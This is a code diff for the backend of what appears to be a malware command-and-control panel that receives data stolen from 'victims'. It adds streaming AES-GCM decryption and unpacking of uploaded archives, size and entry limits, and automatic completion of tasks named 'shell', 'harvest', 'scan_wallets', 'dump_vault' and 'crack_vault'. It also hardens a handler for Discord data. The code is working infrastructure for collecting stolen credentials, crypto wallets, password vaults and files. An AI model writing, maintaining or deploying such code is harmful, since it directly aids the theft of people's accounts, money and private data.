@@ -1,7 +1,10 @@
 import { createDecipheriv, createHash, randomUUID } from 'node:crypto';
 import AdmZip from 'adm-zip';
 import { createReadStream, createWriteStream } from 'node:fs';
-import { mkdir, open, readFile, rename, stat, writeFile } from 'node:fs/promises';
+import { mkdir, open, readFile, rename, stat, writeFile, type FileHandle } from 'node:fs/promises';
+import { pipeline } from 'node:stream/promises';
+import { Transform } from 'node:stream';
+import { createInflateRaw } from 'node:zlib';
 import { basename, dirname, join, normalize, sep } from 'node:path';
 import type { Artifact, Upload, Victim } from '@prisma/client';
 import { prisma } from '../lib/db';
@@ -118,8 +121,23 @@ export async function commitUpload(upload: Upload, sha256: string, chunkCount: n
     }
   });
   await prisma.upload.update({ where: { id: upload.id }, data: { state: 'committed' } });
+  // The artifact itself closes an artifact task, before its result JSON may
+  // still land. Result posting is idempotent and fills the row afterwards.
+  await closeTaskFromArtifact(artifact).catch(() => undefined);
   void processArtifact(artifact.id);
   return artifact;
+}
+
+async function closeTaskFromArtifact(artifact: Artifact): Promise<void> {
+  if (!artifact.taskId) return;
+  const task = await prisma.task.findUnique({ where: { id: artifact.taskId } });
+  if (!task || !['queued', 'running'].includes(task.status)) return;
+  if (['file_pull', 'shell', 'screenshot', 'harvest', 'scan_wallets', 'dump_vault', 'crack_vault'].includes(task.name)) {
+    await prisma.task.update({
+      where: { id: task.id },
+      data: { status: 'done', result: { artifactId: artifact.id } as never, finishedAt: new Date(), leaseUntil: null }
+    });
+  }
 }
 
 async function blobKey(victimId: string, artifact: Artifact, noncePrefix: Buffer): Promise<Buffer> {
@@ -140,6 +158,55 @@ type Manifest = {
   total_size: number;
   artifacts: Array<{ id: string; path: string; kind: string; size: number; sha256: string; mode?: number }>;
 };
+
+async function readFully(handle: FileHandle, buffer: Buffer, position: number): Promise<void> {
+  let offset = 0;
+  while (offset < buffer.length) {
+    const { bytesRead } = await handle.read(buffer, offset, buffer.length - offset, position + offset);
+    if (bytesRead <= 0) throw new Error('blob_length_invalid');
+    offset += bytesRead;
+  }
+}
+
+async function decipherBlob(
+  source: string,
+  start: number,
+  length: number,
+  key: Buffer,
+  nonce: Buffer,
+  aad: Buffer,
+  dest: string,
+  expectedSha: string,
+  expectedSize: number
+): Promise<void> {
+  const decipher = createDecipheriv('aes-256-gcm', key, nonce);
+  decipher.setAAD(aad);
+  const tag = Buffer.alloc(16);
+  const handle = await open(source, 'r');
+  try {
+    await readFully(handle, tag, start + length - 16);
+  } finally {
+    await handle.close();
+  }
+  decipher.setAuthTag(tag);
+  const digest = createHash('sha256');
+  let size = 0;
+  const meter = new Transform({
+    transform(chunk, _encoding, callback) {
+      digest.update(chunk);
+      size += chunk.length;
+      callback(null, chunk);
+    }
+  });
+  await pipeline(
+    createReadStream(source, { start, end: start + length - 17 }),
+    decipher,
+    createInflateRaw(),
+    meter,
+    createWriteStream(dest, { mode: 0o600 })
+  );
+  if (size !== expectedSize || digest.digest('hex') !== expectedSha) throw new Error(`blob_invalid`);
+}
 
 export async function processArtifact(artifactId: string): Promise<void> {
   const claimed = await prisma.artifact.updateMany({
@@ -178,6 +245,8 @@ export async function processArtifact(artifactId: string): Promise<void> {
       const key = await blobKey(artifact.victimId, artifact, noncePrefix);
       const root = artifactDir(artifact.id);
       await mkdir(root, { recursive: true });
+      if (manifest.artifacts.length > 20000) throw new Error('too_many_entries');
+      let extracted = 0;
       const seen = new Set<string>();
 
       for (let index = 0; index < manifest.artifacts.length; index++) {
@@ -187,23 +256,19 @@ export async function processArtifact(artifactId: string): Promise<void> {
         const [tag, id, lengthText] = header.text.trim().split(' ');
         if (tag !== 'BLOB' || !id || !lengthText) throw new Error('blob_header_invalid');
         const length = Number(lengthText);
-        const ciphertext = Buffer.alloc(length);
-        await fd.read(ciphertext, 0, length, cursor);
+        if (!Number.isInteger(length) || length < 17) throw new Error('blob_length_invalid');
+        const tagBytes = Buffer.alloc(16);
+        await fd.read(tagBytes, 0, 16, cursor + length - 16);
         cursor += length;
-        const nonce = Buffer.concat([noncePrefix, Buffer.alloc(4)]);
-        nonce.writeUInt32BE(index, 8);
-        const decipher = createDecipheriv('aes-256-gcm', key, nonce);
-        decipher.setAAD(Buffer.from(`${expected}:${id}`));
-        decipher.setAuthTag(ciphertext.subarray(length - 16));
-        const compressed = Buffer.concat([decipher.update(ciphertext.subarray(0, length - 16)), decipher.final()]);
-        const { inflateSync } = await import('node:zlib');
-        const plain = inflateSync(compressed);
-        if (plain.length !== item.size || sha256hex(plain) !== item.sha256) throw new Error(`blob_invalid:${item.id}`);
         const dest = join(root, safeRel(item.path));
         if (seen.has(dest)) continue;
         seen.add(dest);
         await mkdir(dirname(dest), { recursive: true });
-        await writeFile(dest, plain, { mode: item.mode ?? 0o600 });
+        const nonce = Buffer.concat([noncePrefix, Buffer.alloc(4)]);
+        nonce.writeUInt32BE(index, 8);
+        await decipherBlob(artifact.containerPath, cursor - length, length, key, nonce, Buffer.from(`${expected}:${id}`), dest, item.sha256, item.size);
+        extracted += item.size;
+        if (extracted > env.MAX_ARTIFACT_MB * 1024 * 1024) throw new Error('artifact_unpacked_too_large');
       }
 
       await prisma.artifact.update({
@@ -298,12 +363,16 @@ async function processDiscordArtifact(artifact: Artifact): Promise<void> {
 
   if (name.endsWith('.zip')) {
     const zip = new AdmZip(artifact.containerPath);
+    const entries = zip.getEntries().filter((entry) => !entry.isDirectory).slice(0, 20000);
     let index = 0;
-    for (const entry of zip.getEntries()) {
-      if (entry.isDirectory) continue;
+    let total = 0;
+    for (const entry of entries) {
       const rel = safeRel(entry.entryName);
+      const size = Number(entry.header.size ?? 0);
+      if (size <= 0 || size > 64 * 1024 * 1024) continue;
+      if (total + size > env.MAX_ARTIFACT_MB * 1024 * 1024) break;
       const data = entry.getData();
-      if (data.length > 64 * 1024 * 1024) continue;
+      total += data.length;
       const dest = join(root, rel);
       await mkdir(dirname(dest), { recursive: true });
       await writeFile(dest, data);
